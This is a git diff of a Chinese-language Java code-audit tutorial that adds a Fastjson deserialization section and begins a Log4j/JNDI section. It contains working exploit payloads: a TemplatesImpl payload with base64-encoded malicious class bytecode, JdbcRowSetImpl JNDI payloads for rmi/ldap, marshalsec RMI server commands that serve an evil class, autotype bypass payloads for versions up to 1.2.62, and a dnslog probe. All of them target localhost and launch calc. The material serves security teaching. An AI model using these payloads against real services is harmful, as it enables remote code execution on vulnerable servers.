@@ -1,4 +1,4 @@
-# java代码审计
+<img width="789" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/62627a9b-a0c3-4161-b3b6-79a5e4f437d3"># java代码审计
 ## 一、sql注入
 1、通过一些关键字可以定位到SQL语句附近
 
@@ -4377,11 +4377,1564 @@ public class CC1Test3 {
 
 
 ## 十一、Fastjson漏洞
-
-![image-20231121162500962](/Users/bingtanghulu/Library/Application Support/typora-user-images/image-20231121162500962.png)
-
 **基础介绍**
 
-Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将 序列化的速度提升到极致，深受用户喜爱。 项目地址：https://github.com/alibaba/fastjson。
+Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将 序列化的速度提升到极致，深受用户喜爱。 项目地址：https://github.com/alibaba/fastjson。产品主要提供两个接口 JSON.toJSONString 和 **JSON.parseObject/JSON.parse** 来分别实现 序列化和反序列化操作。 产品识别：使用不闭合花括号进行报错回显，报错中往往带有fastjson
+实现序列化通常使用 JSON.toJSONString 接口，maven导入FastJson依赖包
 
-产品主要提供两个接口 JSON.toJSONString 和 **JSON.parseObject/JSON.parse** 来分别实现 序列化和反序列化操作。 产品识别：使用不闭合花括号进行报错回显，报错中往往带有fastjson
+添加pom.xml依赖
+
+```xml
+        <dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.24</version>
+        </dependency>
+
+```
+
+**fastjson的使用**
+
+将类序列化为字符串,主要就是 JSON.toJSONString 函数的使用,该函数可以仅仅传入一个参数，也可以传入两个参数
+
+user.java
+
+```java
+package com.example.demo;
+
+public class user {
+    private int age;
+    private String username;
+    private String password;
+
+    // 默认无参数构造函数
+    public user() {
+        System.out.println("无参构造方法被调用");
+    }
+
+    public user(int age, String username, String password) {
+        System.out.println("有参构造方法被调用");
+        this.age = age;
+        this.username = username;
+        this.password = password;
+    }
+
+    public int getAge() {
+
+        System.out.println("get函数被调用");
+        return age;
+    }
+
+    public void setAge(int age) {
+        System.out.println("set函数被调用");
+        this.age = age;
+    }
+
+    public String getUsername() {
+        return username;
+    }
+
+    public void setUsername(String username) {
+        this.username = username;
+    }
+
+    public String getPassword() {
+        return password;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+    @Override
+    public String toString() {
+        System.out.println("toString函数被调用。。。");
+        return "user{" +
+                "age=" + age +
+                ", username='" + username + '\'' +
+                ", password='" + password + '\'' +
+                '}' ;
+    }
+}
+```
+
+main.java
+
+```java
+package com.example.demo;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class main {
+    public static void main(String[] args) throws Exception {
+        user user = new user(12, "xbb", "123456");
+        // 序列化⽅式
+        String json1 = JSON.toJSONString(user);
+        //生成的JSON字符串中包含类名，以便在反序列化时能够恢复正确的类类型
+        String json2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
+        System.out.println(json1);
+        System.out.println(json2);
+        System.out.println("json1的变量类型：" + json1.getClass().getSimpleName());
+}
+```
+
+<img width="1267" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/30f568e8-ac80-40a9-bcce-5d131a654d88">
+
+将字符串还原为对象
+
+涉及两个函数，
+
+	JSON.parse
+	
+	JSON.parseObject
+
+main.java
+
+```java
+package com.example.demo;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class main {
+    public static void main(String[] args) throws Exception {
+        user user = new user(12, "xbb", "123456");
+        // 序列化⽅式
+        String json1 = JSON.toJSONString(user);
+        //生成的JSON字符串中包含类名，以便在反序列化时能够恢复正确的类类型
+        String json2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
+        System.out.println(json1);
+        System.out.println(json2);
+        System.out.println("json1的变量类型：" + json1.getClass().getSimpleName());
+
+        //使用JSON.parse函数从字符串还原为对象
+        System.out.println(JSON.parse(json1));
+        //输出还原成什么类型；JSONObject
+        System.out.println(JSON.parse(json1).getClass().getSimpleName());
+
+        System.out.println(JSON.parseObject(json1));
+        //输出还原成什么类型；JSONObject
+        System.out.println(JSON.parseObject(json1).getClass().getSimpleName());
+
+        //使用JSON.parseObject 函数从字符串还原为对象
+        System.out.println(JSON.parse(json2));
+        System.out.println();
+        System.out.println(JSON.parseObject(json2));
+
+
+    }
+}
+```
+
+```
+对于“  JSON.toJSONString(user) ”这种方式序列化的字符串，
+	
+	两种还原函数，得到的结果一致。
+
+对于“ JSON.toJSONString(user, SerializerFeature.WriteClassName) ” 这种方式序列化得到的字符串，
+	
+	两个函数还原得到的结果不一致，且还原和上面的字符串还原的过程也不一致，
+
+	对于json2字符串，使用JSON.parseObject函数还原的过程，
+	
+		调用无参构造方法
+		调用了set函数
+		调用了get函数
+		输出结果和json1还原一致
+
+	对于json1字符串，使用JSON.parseObject函数还原过程，
+		调用无参构造方法
+		调用set函数
+		调用toString函数
+		输出结果和以上3个不同
+
+```
+<img width="1267" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/d33bb216-6d64-4be2-9b6d-eefc6f7ccc52">
+
+<img width="1068" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/66866fab-c6d1-4763-b37e-ea1457265589">
+
+
+修改脚本执行命令
+
+main.java
+
+```java
+package com.example.demo;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+public class main {
+    public static void main(String[] args) throws Exception {
+        String json2 = "{\"@type\":\"com.example.demo.user\",\"age\":12,\"password\":\"123456\",\"username\":\"calc\"}";
+      //String json2 = "{\"@type\":\"com.example.demo.user\",\"age\":12,\"password\":\"123456\",\"username\":\"xxx\"}";
+
+        System.out.println(JSON.parseObject(json2));
+    }
+}
+```
+
+user.java
+
+```java
+package com.example.demo;
+
+import java.io.IOException;
+
+public class user {
+
+    private int age;
+    private String username;
+    private String password;
+
+    // 默认无参数构造函数
+    public user() {
+        System.out.println("无参构造方法被调用");
+    }
+
+    public user(int age, String username, String password) {
+        System.out.println("有参构造方法被调用");
+        this.age = age;
+        this.username = username;
+        this.password = password;
+    }
+
+    public int getAge() {
+
+        System.out.println("get函数被调用");
+        return age;
+    }
+
+    public void setAge(int age) {
+        System.out.println("set函数被调用");
+        this.age = age;
+    }
+
+    public String getUsername() {return username; }
+
+    public void setUsername(String username) {
+        this.username = username;
+        try {
+     //       Runtime.getRuntime().exec("calc");
+            Runtime.getRuntime().exec(username);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public String getPassword() {
+        return password;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+    @Override
+    public String toString() {
+        System.out.println("toString函数被调用。。。");
+        return "user{" +
+                "age=" + age +
+                ", username='" + username + '\'' +
+                ", password='" + password + '\'' +
+                '}' ;
+    }
+}
+```
+
+<img width="1317" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/45f42b92-7412-4818-b427-6501559a4a26">
+
+### （一）、fastjson漏洞利⽤原理与dnslog
+
+**漏洞原理**
+
+Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和 反序列化机制。通过Fastjson反序列化漏洞，攻击者可以传入一个恶**意构造的JSON内容**，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。 
+
+在某些情况下进行反序列化时，会将反序列化得到的类或其子类的**构造函数**、 **getter/setter** 方法执行，如果这三种方法中存在可利用的入口，则可能导致反序列化漏洞的存在。
+
+**构造POC **
+
+一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类： 
+
+```java
+  { "@type":"xxx.xxx.xxx", "xxx":"xxx", ... }  
+```
+
+json字符串中带有@type
+
+漏洞是利⽤fastjson autotype在处理json对象的时候，未对@type字段进⾏完全的安全性验证，
+
+攻击者可以传⼊危险类，并调⽤危险类连接远程rmi主机，通过其中的恶意类执⾏代码。
+
+攻击者通过这种⽅式可以实现远程代码执⾏漏洞的利⽤，获取服务器的敏感信息泄露，
+
+甚⾄可以利⽤此漏洞进⼀步对服务器数据进⾏修改，增加，删除等操作，对服务器造成巨⼤的影响。
+
+```java
+package com.example.demo;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+public class main {
+    public static void main(String[] args) throws Exception {
+
+        String json2 = "{\"@type\":\"java.net.Inet4Address\", \"val\":\"aa.3htbvu.dnslog.cn\"}";
+        System.out.println(JSON.parseObject(json2));
+        //System.out.println(JSON.parse(json2));
+    }
+}
+```
+
+<img width="810" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/65f715f8-4bb2-4db2-927e-59cc3ae40ab2">
+
+### （二）、fastjson漏洞场景
+
+**1、FastJson <= 1.2.24 反序列化漏洞 -场景1**
+
+导入依赖
+
+```
+<dependency>
+		<groupId>com.alibaba</groupId>
+		<artifactId>fastjson</artifactId>
+		<version>1.2.24</version>
+</dependency>
+
+```
+
+实体类Student中，存在不安全的setter方法，setHeight() 中有执行命令的行为。 
+
+```java
+package com.example.demo;
+
+import java.io.IOException;
+import java.io.Serializable;
+import java.util.Properties;
+/**
+ * 反序列化漏洞：Student实体类
+ **/
+public class Student  implements Serializable {
+    private String name;
+    private int age;
+    private String telephone;
+    private Properties properties;
+    public String height;
+    public Student(){
+        System.out.println("无参构造函数");
+    }
+    public Properties getProperties() {
+        System.out.println("调用getProperties");
+        return properties;
+    }
+    public String getHeight() {
+        System.out.println("调用getHeight");
+        return height;
+    }
+    /**
+     * 不安全的setter方法
+     * @return
+     * @throws IOException
+     */
+    public void setHeight(String height) throws IOException{
+        System.out.println("调用setHeight");
+        Runtime.getRuntime().exec(height);
+        this.height = height;
+    }
+    public String getName() {
+        System.out.println("调用getName");
+        return name;
+    }
+    public void setName(String name) throws IOException{
+        System.out.println("调用setName");
+        this.name = name;
+    }
+    public int getAge() {
+        System.out.println("调用getAge");
+        return age;
+    }
+    public String getTelephone() {
+        System.out.println("调用getTelephone");
+        return telephone;
+    }
+    @Override
+    public String toString() {
+        return "Student4{" +
+                "name='" + name + '\'' +
+                ", age=" + age +
+                ", telephone='" + telephone + '\'' +
+                ", properties=" + properties +
+                ", height='" + height + '\'' +
+                '}';
+    }
+}
+```
+
+使用 JSON.parseObject() 不指定class执行反序列化，会调用指定类的构造函 数、所有属性的getter方法、非私有属性的setter方法。 
+构造POC： @type指定存在可控参数的类。 在height属性中添加命令，通过height属性的setter方法执行命令。
+main
+
+```java
+package com.example.demo;
+
+import com.alibaba.fastjson.JSON;
+import java.io.IOException;
+public class main {
+    public static void main(String[] args) throws IOException {
+
+        String jsonString = "{\"@type\":\"com.example.demo.Student\",\"age\":5,\"name\":\"Tom\",\"telephone\":\"123456\",\"height\":\"calc\",\"properties\":{}}";
+        Object obj = JSON.parseObject(jsonString);
+        System.out.println(obj);
+        System.out.println(obj.getClass());
+
+
+    }
+}
+```
+
+<img width="1590" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/5a1a1b02-40e0-4639-885f-89b9f25ec4e3">
+
+**FastJson <= 1.2.24 反序列化漏洞 -场景2**
+
+影响范围： FastJson 1.2.22-1.2.24版本 利用： 
+
+- 基于TemplateImpl 限制：需要设置Feature.SupportNonPublicField属性进行反序列化操作才能成功触发利用。 
+- 基于JdbcRowSetImpl 限制：由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。 
+- 基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、 7u201、8u191。 
+
+**基于TemplateImpl **
+
+环境依赖： 
+
+```xml
+<!-- fastjson 1.2.22-1.2.24 版本漏洞利用-->
+        <dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.24</version>
+        </dependency>
+        <dependency>
+            <groupId>commons-codec</groupId>
+            <artifactId>commons-codec</artifactId>
+            <version>1.15</version>
+        </dependency>
+        <dependency>
+            <groupId>commons-io</groupId>
+            <artifactId>commons-io</artifactId>
+            <version>2.5</version>
+        </dependency>
+```
+
+**fastjson反序列化TemplatesImpl 利⽤**
+
+这个利用链在实战中利用较少，一个原因是有一些限制，
+
+开启 Feature.SupportNonPublicField 得作用
+
+```
+需要 JSON.parseObject或者 JSON.parse
+先看下这个 Feature.SupportNonPublicField 得作用，
+先看下正常json反序列化得情况，
+然后把set/get得一些函数给注释，
+```
+
+```java
+package com.example.test;
+import com.alibaba.fastjson.JSON;
+
+
+public class main {
+    public static void main(String[] args) throws Exception {
+
+        String json2 = "{\"@type\":\"com.example.test.user\",\"age\":12,\"password\":\"123456\",\"username\":\"calc\"}";
+
+        System.out.println(JSON.parse(json2));
+
+    }
+
+}
+```
+
+```java
+package com.example.test;
+
+public class user {
+
+    private int age;
+    private String username;
+    private String password;
+
+    // 默认无参数构造函数
+    public user() {
+        System.out.println("无参构造方法被调用");
+    }
+
+    public user(int age, String username, String password) {
+        System.out.println("有参构造方法被调用");
+        this.age = age;
+        this.username = username;
+        this.password = password;
+    }
+
+    /*public int getAge() {
+
+        System.out.println("get函数被调用");
+        return age;
+    }
+
+    public void setAge(int age) {
+        System.out.println("set函数被调用");
+        this.age = age;
+    }
+
+    public String getUsername() {return username; }
+
+    public void setUsername(String username) {
+        this.username = username;
+        try {
+//            Runtime.getRuntime().exec("calc");
+            Runtime.getRuntime().exec(username);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }*/
+
+    public String getPassword() {
+        return password;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+
+    @Override
+    public String toString() {
+        System.out.println("toString函数被调用。。。");
+        return "user{" +
+                "age=" + age +
+                ", username='" + username + '\'' +
+                ", password='" + password + '\'' +
+                '}' ;
+    }
+}
+```
+<img width="963" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/cd8c74c1-e28f-4420-be2d-f7e04fbda45b">
+
+为设置age、username属性得set/get函数去掉了，所以输出为空，
+此时，我们加上 Feature.SupportNonPublicField 再看下
+
+```java
+package com.example.test;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+public class main {
+    public static void main(String[] args) throws Exception {
+
+        String json2 = "{\"@type\":\"com.example.test.user\",\"age\":12,\"password\":\"123456\",\"username\":\"calc\"}";
+
+        System.out.println(JSON.parse(json2,Feature.SupportNonPublicField));
+    }
+}
+```
+
+<img width="704" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/4d635cc9-5a99-4c3b-af3b-46b461afb17a">
+
+```
+相当于开启了给属性增加了set/get得方法。
+
+而上面我们分析 TemplatesImpl 利用链得时候，细心得同学可能发现了，
+
+其对应得类缺少set/get函数，所以，这个链利用得条件就是rd在json反序列化得时候，
+
+增加  Feature.SupportNonPublicField  这个参数，这也是该链利用得前提。
+```
+
+构造利用payload
+
+```java
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.io.IOException;
+
+public class Evil extends AbstractTranslet {
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+//这两个transform方法覆盖了AbstractTranslet中的方法
+    static {
+        System.out.println("静态代码块");
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+
+    }
+
+    {
+        System.out.println("构造代码块");
+    }
+
+    public Evil() {
+        System.out.println("无参构造");
+    }
+
+    public Evil(String arg) {
+        System.out.println("有参构造");
+    }
+}
+```
+
+````java
+package com.example.test;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+
+public class test4 {
+    public static void main(String[] args) throws Exception {
+
+        byte[] bytes = Files.readAllBytes(Paths.get("D:\\code\\java\\fastjson\\target\\classes\\Evil.class"));
+      //从指定位置读取一个名为Evil.class的Java类文件，并将其内容作为字节数组存储在bytes变量中
+        String code = Base64.getEncoder().encodeToString(bytes);
+      //将字节数组转换为Base64编码的字符串
+        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
+
+        String payload = "{\"@type\":\"" + NASTY_CLASS +
+                "\",\"_bytecodes\":[\"" + code + "\"]," +
+                "'_name':'xbb'," +
+                "'_tfactory':{}," +
+                "\"_outputProperties\":{}}\n";
+
+        System.out.println(payload);
+
+        JSON.parseObject(payload, Feature.SupportNonPublicField);
+    }
+}
+````
+
+得到最终得payload
+
+```
+{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQATAoADwAuCQAvADAIADEKADIAMwgANAgANQgANgoANwA4CAA5CgA3ADoHADsHADwKAAwAPQcAPgcAPwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTEV2aWw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAEABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAA2FyZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHADsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAiACMHAEEMAEIAQwEAD+aehOmAoOS7o+eggeWdlwcARAwARQAkAQAM5peg5Y+C5p6E6YCgAQAM5pyJ5Y+C5p6E6YCgAQAP6Z2Z5oCB5Luj56CB5Z2XBwBGDABHAEgBAARjYWxjDABJAEoBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MACIASwEABEV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAA4ADwAAAAAABQABABAAEQACABIAAAA/AAAAAwAAAAGxAAAAAgATAAAABgABAAAADgAUAAAAIAADAAAAAQAVABYAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABAAHQACABIAAABJAAAABAAAAAGxAAAAAgATAAAABgABAAAAEwAUAAAAKgAEAAAAAQAVABYAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiACMAAQASAAAASwACAAEAAAAVKrcAAbIAAhIDtgAEsgACEgW2AASxAAAAAgATAAAAEgAEAAAAIwAEACAADAAkABQAJQAUAAAADAABAAAAFQAVABYAAAABACIAJAABABIAAABVAAIAAgAAABUqtwABsgACEgO2AASyAAISBrYABLEAAAACABMAAAASAAQAAAApAAQAIAAMACoAFAArABQAAAAWAAIAAAAVABUAFgAAAAAAFQAlACYAAQAIACcAIwABABIAAAByAAMAAQAAAB+yAAISB7YABLgACBIJtgAKV6cADUu7AAxZKrcADb+xAAEACAARABQACwADABMAAAAaAAYAAAAWAAgAGAARABsAFAAZABUAGgAeAB0AFAAAAAwAAQAVAAkAKAApAAAAKgAAAAcAAlQHACsJAAEALAAAAAIALQ=="],'_name':'xbb','_tfactory':{},"_outputProperties":{}}
+
+```
+
+**基于JdbcRowSetImpl**
+
+```
+基于JdbcRowSetImpl的利用链主要有利用方式有 JNDI+RMI和JNDI+LDAP 
+```
+
+构造 poc： 
+
+```java
+{
+ "@type":"com.sun.rowset.JdbcRowSetImpl",
+	"dataSourceName":"rmi://127.0.0.1:1099/EvilCalc",
+	"autoCommit":true
+}
+```
+
+```java
+{
+	"@type":"com.sun.rowset.JdbcRowSetImpl",
+	"dataSourceName":"ldap://127.0.0.1:1389/EvilCalc",
+	"autoCommit":true
+}
+```
+
+@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中 心绑定的EvilCalc服务，autoCommit有且必须为true或false等布尔值类型
+
+启动RMI服务：（使用 marshalsec 工具来完成） 
+
+```java
+https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/R MIRefServer.java 
+```
+
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/\#EvilCalc
+```
+
+编写恶意类EvilCalc
+
+```java
+import java.io.IOException;
+    public class EvilCalc {
+        public EvilCalc()throws IOException {
+            Runtime.getRuntime().exec("calc");
+        }
+        public static void main(String[] args) throws IOException {
+            EvilCalc evilCalc = new EvilCalc();
+        }
+}
+```
+
+编译为Class文件,启动Web服务，将恶意类文件存放在本地：
+
+测试类：
+
+```java
+package com.example.test;
+
+import com.alibaba.fastjson.JSON;
+
+
+/**
+ *Fastjson 1.2.22-1.2.24版本的反序列化漏洞
+ *基于JdbcRowSetImpl利用链
+ 大
+ **/
+ public class POC2 {
+     
+    public static void main(String[] args) {
+         String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilCalc\", \"autoCommit\":true}";
+        //String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0 /.1:1389/EvilCalc\", \"autoCommit\":true}";
+        JSON.parse(payload);
+    }
+ }
+```
+
+linux、mac和windows环境不同，**加载恶意类工具启动命令不同，否则无法加载到远程的web服务**
+
+```java
+（1）window: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:8888/#EvilCalc"
+  (2)   linux:  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/\#EvilCalc
+```
+
+**区别点：window需要加""在连接、转义符问题**
+
+**注意RMI和LDAP对JDK版本的要求，如果两个需要同时满足，直接安装**jdk1.8.0_101
+
+
+
+**FastJson <= 1.2.48 反序列化漏洞 **
+
+环境搭建-直接在pom.xml中引入相关版本的依赖
+
+```xml
+       <dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.47</version>
+        </dependency>
+        <dependency>
+            <groupId>commons-codec</groupId>
+            <artifactId>commons-codec</artifactId>
+            <version>1.15</version>
+        </dependency>
+        <dependency>
+            <groupId>commons-io</groupId>
+            <artifactId>commons-io</artifactId>
+            <version>2.5</version>
+        </dependency>
+```
+
+编写恶意类，并将其编译成class类文件
+
+```java
+package com.example.test;
+
+public class EvilCalc1 {
+    static {
+        try {
+            Runtime rt = Runtime.getRuntime();
+            String commands = "calc";
+            Process pc = rt.exec(commands);
+            pc.waitFor();
+        } catch (Exception e) {
+            // do nothing
+        }
+    }
+
+    public static void main(String[] args) {
+        EvilCalc1 poc3 = new EvilCalc1();
+    }
+}
+```
+
+编译的时候包名称去掉侯采取手动javac命令编译，否则会加载恶意类的时候回出错
+
+使用python开启web服务，编译好的恶意类访问web更目录下
+
+```java
+python -m SimpleHTTPServer 8000  //对于 Python 2.x：
+
+python -m http.server 8000  //对于 Python 3.x：
+```
+
+使用marshalsec-0.0.3-SNAPSHOT-all.jar开启RMI或LDAR服务，使其具备远程加载web服务下（上一步）下的恶意类的提交
+
+```java
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:8000/#EvilCalc1"
+```
+
+编写并运行poc，即可触发漏洞
+
+```java
+package com.example.test;
+import com.alibaba.fastjson.JSON;
+/**
+ *  FastJson <= 1.2.48 反序列化漏洞
+ *基于JdbcRowSetImpl利用链
+ 大
+ **/
+public class POC3 {
+    public static void main(String[] args) {
+        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/#EvilCalc1\",\"autoCommit\":true}}}";
+//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/EvilCalc\", \"autoCommit\":true}";
+        JSON.parse(payload);
+    }
+}
+```
+
+**FastJson <= 1.2.62 反序列化漏洞 **
+
+poc如下：
+
+```java
+String text1 = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1099/exploit\"}";
+
+```
+
+测试类
+
+```java
+/**
+ *  FastJson <= 1.2.62 反序列化漏洞  测试类
+ **/
+public class POC4 {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+      //通过ParserConfig获取全局实例，并设置了自动类型支持为true。Fastjson库中的ParserConfig允许配置解析器的行为，其中的setAutoTypeSupport(true)操作允许反序列化时自动检测和使用类型信息。
+        String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://127.0.0.1:1389/EvilCalc1\"}";
+        JSON.parse(poc);
+    }
+}
+```
+
+## 十二、log4j漏洞
+
+```
+Apache Log4j2是⼀个基于Java的⽇志记录⼯具。
+该⼯具重写了Log4j框架，并且引⼊了⼤量丰富的特性。
+使用1.8_65和1.8_151都可以直接触发，
+```
+
+针对CC3链没有思路的问题解答
+（1）先定位漏洞属于通用型漏洞还是属于程序自编码漏洞
+（2）需要回顾这种漏洞的特点和规律
+（3）踩点，寻找源码是否引用了与漏洞相关的组件和寻找漏洞入口（突破口）
+比如去查看该项目下是否使用了CC组件，
+对于maven项目通过pom文件确定  
+对于非maven的传统项目，去找jar,往往放在一个lib,比如webapp/web-inf/lib
+（4）漏洞分析与追踪
+需要符合两个要求：（1）对这个组件有一定的了解 （2）熟悉这个漏洞的原理
+
+审计思路
+以Log4j漏洞审计为案例，谈一谈审计如何快速的锁定通用型漏洞
+1、确定源码是否引用了漏洞所属的开源组件
+该项目是一个maven项目，直接在Pom文件中搜索log4j的jar包及版本引用问题，如果该版本受影响，进入下一步
+
+<img width="583" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/b1d8370f-81e7-411e-80f5-9b56d90f291e">
+
+2、寻找漏洞的入口
+
+<img width="362" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/7e3be53b-594e-4473-9196-3c964be8ecd5">
+
+3、逐个排查入口是否有效，有效即可复现
+
+### （一）、漏洞原理
+
+**（1）、JDNI原理**
+
+- JNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于**命名空间**的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。**这意味着任何基于名字的技术都能通过JNDI而提供服务**，只要JNDI支持这项技术。 
+
+- JNDI目前所支持的技术包括**LDAP**、CORBA Common Object Service（COS）名字服务、**RMI**、NDS、**DNS**、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。JDNI通过绑定的概念将**对象和名称联系起来**。**在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。** 
+
